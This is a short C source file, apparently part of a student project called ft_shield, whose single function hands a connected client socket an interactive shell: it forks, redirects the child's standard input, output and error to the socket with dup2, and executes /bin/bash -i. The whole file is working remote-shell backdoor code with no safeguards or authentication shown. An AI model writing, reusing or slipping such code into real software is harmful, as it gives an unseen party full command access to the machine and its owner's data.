#include "ft_shield.h"

void	*shell_function(void *data)
{
	const int	client_fd = (int)(long)data;
	// int			status;
	pid_t		pid;

	// send(client_fd, REMOTE_OPENED, sizeof(REMOTE_OPENED), 0);
	pid = fork();
	if (pid == 0)
	{
		char *args[] = {"/bin/bash", "-i", NULL};
		dup2(client_fd, STDIN_FILENO);
		dup2(client_fd, STDERR_FILENO);
		dup2(client_fd, STDOUT_FILENO);
		close(client_fd);
		execv("/bin/bash", args);
		exit(1);
	}
	close(client_fd);

	// waitpid(-1, &status, 0);
	return (NULL);
}
